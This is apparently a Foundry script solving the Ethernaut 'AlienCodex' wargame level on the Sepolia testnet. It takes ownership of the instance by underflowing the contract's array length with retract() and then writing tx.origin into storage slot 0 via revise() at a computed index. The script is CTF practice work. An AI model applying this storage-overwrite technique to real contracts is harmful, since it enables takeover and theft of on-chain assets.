// SPDX-License-Identifier: MIT

pragma solidity 0.5.0;
pragma experimental ABIEncoderV2;

import {AlienCodex} from "src/19/AlienCodex.sol";
import {AlienCodexFactory} from "src/19/AlienCodexFactory.sol";
import {IEthernaut} from "src/IEthernaut-05.sol";
import {Level} from "src/Level-05.sol";

contract AlienCodexExploit {
    address public levelFactory;
    address payable public instanceAddress;
    AlienCodex public instanceContract;
    address public ethernaut;

    // Most functions included in the Vm forge-std inetrface are usable even in solc 0.5.0. We'll include the ones we need for deploying and validation our solution.
    address internal constant VM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    function run() external {
        VM vm = VM(VM_ADDRESS);

        levelFactory = vm.envAddress("LEVEL19_SEPOLIA_ADDRESS"); // factory level 19 in sepolia
        ethernaut = vm.envAddress("ETHERNAUT_SEPOLIA_ADDRESS"); // ethernaut sepolia address

        // Deploy a new instance using the level Address
        IEthernaut(ethernaut).createLevelInstance(Level(levelFactory));

        // VM.Log[] memory entries = vm.getRecordedLogs(); Unfortunately this does not work for solidity 0.5.0 as an opcode used is not recognized. We will have to manually deploy and instance and use it in our env file

        instanceAddress = address(uint160(address(vm.envAddress("LEVEL19_SEPOLIA_INSTANCE_ADDRESS"))));  // This is how to typecast into a payable address in solidity 0.5.0 https://ethereum.stackexchange.com/questions/65693/how-to-cast-address-to-address-payable-in-solidity-0-5-0

        instanceContract = AlienCodex(instanceAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // Exploit
        instanceContract.makeContact();
        instanceContract.retract();
        instanceContract.revise(
            2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1, bytes32(uint256(uint160(tx.origin)))
        );

        // Submit results
        IEthernaut(ethernaut).submitLevelInstance(instanceAddress);

        vm.stopBroadcast();
    }
}

interface VM {
    struct Log {
        bytes32[] topics;
        bytes data;
        address emitter;
    }
    // Using the address that calls the test contract, has all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain
    function startBroadcast() external;
    // Has all subsequent calls (at this call depth only) create transactions with the address provided that can later be signed and sent onchain
    function startBroadcast(address signer) external;
    // Has all subsequent calls (at this call depth only) create transactions with the private key provided that can later be signed and sent onchain
    function startBroadcast(uint256 privateKey) external;
    // Stops collecting onchain transactions
    function stopBroadcast() external;
    function envUint(string calldata name) external view returns (uint256 value);
    function envAddress(string calldata name) external view returns (address value);
    // Record all the transaction logs
    function recordLogs() external;
    // Gets all the recorded logs
    function getRecordedLogs() external returns (Log[] memory logs);
}
